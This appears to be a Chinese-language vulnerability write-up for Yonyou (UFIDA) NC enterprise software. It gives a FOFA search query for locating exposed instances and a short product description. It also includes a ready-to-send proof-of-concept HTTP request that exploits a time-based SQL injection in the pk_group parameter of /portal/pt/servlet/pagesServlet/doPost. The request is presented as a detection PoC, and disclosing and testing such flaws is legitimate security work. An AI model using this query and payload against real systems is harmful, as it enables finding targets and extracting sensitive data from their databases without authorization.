**fofa**

```
app="用友-UFIDA-NC"
```

**一、漏洞简述**

用友NC以“全球化集团管控、行业化解决方案、全程化电子商务、平台化应用集成”的管理业务理念而设计，采用J2EE架构和先进开放的集团级开发平台UAP，形成了集团管控8大领域15大行业68个细分行业的解决方案，是中国大企业集团管理信息化应用系统的首选。其接口

/portal/pt/servlet/pagesServlet/doPost存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

***\*二、漏洞检测poc\****

```yaml
GET /portal/pt/servlet/pagesServlet/doPost?pageId=login&pk_group=1'waitfor+delay+'0:0:5'-- HTTP/1.1
Host: x.x.x.x
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
Content-Length: 6
```

